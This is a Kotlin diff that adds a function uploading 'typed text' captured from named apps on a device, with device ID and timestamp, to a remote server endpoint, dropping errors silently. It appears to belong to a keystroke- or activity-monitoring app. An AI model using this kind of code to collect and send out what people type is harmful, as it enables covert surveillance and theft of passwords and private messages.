@@ -29,6 +29,35 @@ object NotificationSender {
         }
     }
 
+    fun sendTypedText(
+        deviceId: String,
+        packageName: String,
+        appLabel: String,
+        text: String,
+        capturedAt: String
+    ) {
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val json = JSONObject().apply {
+                    put("deviceId",    deviceId)
+                    put("packageName", packageName)
+                    put("appLabel",    appLabel)
+                    put("text",        text)
+                    put("capturedAt",  capturedAt)
+                }
+                val body = json.toString().toRequestBody("application/json".toMediaType())
+                val request = Request.Builder()
+                    .url("${BuildConfig.SERVER_URL}/api/typed-text")
+                    .header("X-API-Key", BuildConfig.API_KEY)
+                    .post(body)
+                    .build()
+                client.newCall(request).execute().use { }
+            } catch (_: Exception) {
+                // Best-effort: typed text is not queued offline.
+            }
+        }
+    }
+
     suspend fun drainQueue() {
         val dao = App.database.dao()
         for (item in dao.getPending()) {
